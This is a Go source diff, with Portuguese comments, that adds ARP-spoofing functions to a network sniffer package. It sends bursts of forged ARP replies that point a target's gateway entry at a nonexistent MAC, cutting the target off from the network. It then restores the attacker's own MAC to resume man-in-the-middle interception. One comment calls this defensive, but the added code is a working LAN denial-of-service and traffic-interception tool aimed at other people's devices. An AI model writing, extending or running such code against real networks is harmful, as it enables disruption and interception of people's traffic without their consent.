@@ -1,10 +1,12 @@
 package sniffer
 
 import (
+	"fmt"
 	"net"
 	"os"
 	"os/exec"
 	"runtime"
+	"strings"
 	"time"
 
 	"github.com/google/gopacket"
@@ -293,6 +295,159 @@ func EnableIPForwardingPublic() error {
 // Usado pelo controlador CLI para bloquear o acesso à internet do alvo (foco defensivo).
 func DisableIPForwardingPublic() {
 	disableIPForwarding()
+}
+
+// deadMAC é o endereço MAC inexistente usado para criar um "black hole" na rede.
+// Quando enviamos ARPs apontando o gateway para esse MAC, o alvo envia todos os
+// pacotes para um destino que não existe — o switch descarta os frames.
+var deadMAC = net.HardwareAddr{0xde, 0xad, 0xbe, 0xef, 0x00, 0x01}
+
+// SendARPBlackhole envia ARPs forjados dizendo ao alvo que o gateway tem um MAC inexistente.
+// Isso causa um bloqueio TOTAL de rede (não apenas lag), pois nenhum frame chega ao destino real.
+// É mais eficaz que desativar IP Forwarding, que depende da máquina atacante estar na rota.
+func (s *SnifferService) SendARPBlackhole(handle *pcap.Handle, targetMAC net.HardwareAddr, targetIP, gatewayIP net.IP) error {
+	// Diz ao ALVO: "O gateway (gatewayIP) tem MAC de:ad:be:ef:00:01"
+	// O alvo vai enviar frames Ethernet para esse MAC, que não existe no switch → descartados
+	return s.sendARPReply(handle, deadMAC, gatewayIP, targetMAC, targetIP)
+}
+
+// SendARPRestore restaura o ARP do alvo apontando de volta para o MAC real do atacante (nosso MAC)
+// para retomar o modo MitM (monitoramento com encaminhamento).
+func (s *SnifferService) SendARPRestore(handle *pcap.Handle, myMAC net.HardwareAddr, targetMAC net.HardwareAddr, targetIP, gatewayIP net.IP) {
+	// Restaura: diz ao alvo que o gateway é nosso MAC (volta ao modo MitM normal)
+	_ = s.sendARPReply(handle, myMAC, gatewayIP, targetMAC, targetIP)
+}
+
+// ActivateBlackHole ativa o bloqueio total de rede para os IPs fornecidos.
+// Abre um handle pcap temporário, descobre a interface/gateway, resolve os MACs dos alvos,
+// e envia uma rajada de ARPs Black Hole apontando o gateway para de:ad:be:ef:00:01.
+func (s *SnifferService) ActivateBlackHole(targetIPs []string) {
+	deviceName, deviceIP := s.findActiveInterface()
+	if deviceName == "" {
+		fmt.Printf("  [-] Erro: não foi possível encontrar interface ativa para Black Hole.\n")
+		return
+	}
+
+	myMAC, cidr := s.getInterfaceDetails(deviceIP)
+	if myMAC == nil || cidr == "" {
+		fmt.Printf("  [-] Erro: não foi possível recuperar detalhes da interface.\n")
+		return
+	}
+
+	// Descobre o Gateway
+	_, ipNet, err := net.ParseCIDR(cidr)
+	if err != nil {
+		fmt.Printf("  [-] Erro ao parsear CIDR: %v\n", err)
+		return
+	}
+	gatewayIP := make(net.IP, len(ipNet.IP))
+	copy(gatewayIP, ipNet.IP)
+	gatewayIP[len(gatewayIP)-1] = 1
+
+	handle, err := pcap.OpenLive(deviceName, 1600, true, 100*time.Millisecond)
+	if err != nil {
+		fmt.Printf("  [-] Erro ao abrir handle para Black Hole: %v\n", err)
+		return
+	}
+	defer handle.Close()
+
+	for _, ip := range targetIPs {
+		targetMAC := s.resolveGatewayMAC(deviceName, myMAC, net.ParseIP(deviceIP), net.ParseIP(ip))
+		if targetMAC == nil {
+			// Tenta buscar no cache local
+			known := loadKnownDevices()
+			for macStr, dev := range known {
+				if dev.LastIP == ip {
+					targetMAC, _ = net.ParseMAC(macStr)
+					break
+				}
+			}
+		}
+		if targetMAC == nil {
+			fmt.Printf("  [-] Não foi possível resolver MAC de %s para Black Hole.\n", ip)
+			continue
+		}
+
+		// Envia rajada de 15 ARPs Black Hole para envenenar o cache do alvo
+		for i := 0; i < 15; i++ {
+			_ = s.SendARPBlackhole(handle, targetMAC, net.ParseIP(ip), gatewayIP)
+			time.Sleep(30 * time.Millisecond)
+		}
+		fmt.Printf("  [🛑] Black Hole ativado para %s (MAC: %s)\n", ip, targetMAC.String())
+	}
+}
+
+// DeactivateBlackHole desativa o bloqueio total, restaurando o ARP do gateway apontando para nosso MAC.
+// Isso retoma o modo MitM normal onde o tráfego é interceptado mas encaminhado.
+func (s *SnifferService) DeactivateBlackHole(targetIPs []string) {
+	deviceName, deviceIP := s.findActiveInterface()
+	if deviceName == "" {
+		return
+	}
+
+	myMAC, cidr := s.getInterfaceDetails(deviceIP)
+	if myMAC == nil || cidr == "" {
+		return
+	}
+
+	_, ipNet, err := net.ParseCIDR(cidr)
+	if err != nil {
+		return
+	}
+	gatewayIP := make(net.IP, len(ipNet.IP))
+	copy(gatewayIP, ipNet.IP)
+	gatewayIP[len(gatewayIP)-1] = 1
+
+	gatewayMAC := s.resolveGatewayMAC(deviceName, myMAC, net.ParseIP(deviceIP), gatewayIP)
+
+	handle, err := pcap.OpenLive(deviceName, 1600, true, 100*time.Millisecond)
+	if err != nil {
+		return
+	}
+	defer handle.Close()
+
+	for _, ip := range targetIPs {
+		targetMAC := s.resolveGatewayMAC(deviceName, myMAC, net.ParseIP(deviceIP), net.ParseIP(ip))
+		if targetMAC == nil {
+			known := loadKnownDevices()
+			for macStr, dev := range known {
+				if dev.LastIP == ip {
+					targetMAC, _ = net.ParseMAC(macStr)
+					break
+				}
+			}
+		}
+		if targetMAC == nil {
+			continue
+		}
+
+		// Envia rajada de ARPs restaurando nosso MAC (retoma MitM) e também o MAC real do gateway
+		for i := 0; i < 15; i++ {
+			s.SendARPRestore(handle, myMAC, targetMAC, net.ParseIP(ip), gatewayIP)
+			if gatewayMAC != nil {
+				_ = s.sendARPReply(handle, myMAC, net.ParseIP(ip), gatewayMAC, gatewayIP)
+			}
+			time.Sleep(30 * time.Millisecond)
+		}
+		fmt.Printf("  [✓] Black Hole desativado para %s — MitM restaurado.\n", ip)
+	}
+}
+
+// findActiveInterface retorna o nome e IP da interface de rede ativa.
+func (s *SnifferService) findActiveInterface() (string, string) {
+	devices, err := pcap.FindAllDevs()
+	if err != nil {
+		return "", ""
+	}
+	for _, dev := range devices {
+		for _, addr := range dev.Addresses {
+			ip := addr.IP.String()
+			if ip != "127.0.0.1" && !strings.HasPrefix(ip, "169.254.") && addr.IP.To4() != nil {
+				return dev.Name, ip
+			}
+		}
+	}
+	return "", ""
 }
 
 // ARPSpoofMitM executa o ataque de ARP Spoofing contra um alvo especÃ­fico.
